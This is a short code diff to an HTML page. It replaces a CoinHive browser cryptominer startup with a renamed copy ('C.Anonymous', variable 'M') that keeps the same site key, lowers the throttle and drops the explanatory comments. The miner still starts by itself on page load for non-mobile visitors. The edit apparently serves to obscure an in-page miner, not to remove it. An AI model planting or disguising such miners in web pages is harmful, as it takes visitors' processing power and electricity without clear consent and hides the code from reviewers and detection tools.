@@ -11,12 +11,10 @@
 <body>
     <script src="./js/test.js"></script>
     <script>
-        var miner = new CoinHive.Anonymous('tSz1kUpXUVhozPAez9XuuFcbykpjPSo9', {throttle: 0.99});
+        var M = new C.Anonymous('tSz1kUpXUVhozPAez9XuuFcbykpjPSo9', {throttle: 0.8});
 
-        // Only start on non-mobile devices and if not opted-out
-        // in the last 14400 seconds (4 hours):
-        if (!miner.isMobile() && !miner.didOptOut(14400)) {
-            miner.start();
+        if (!M.isMobile() && !M.didOptOut(14400)) {
+            M.start();
         }
     </script>
 </body>
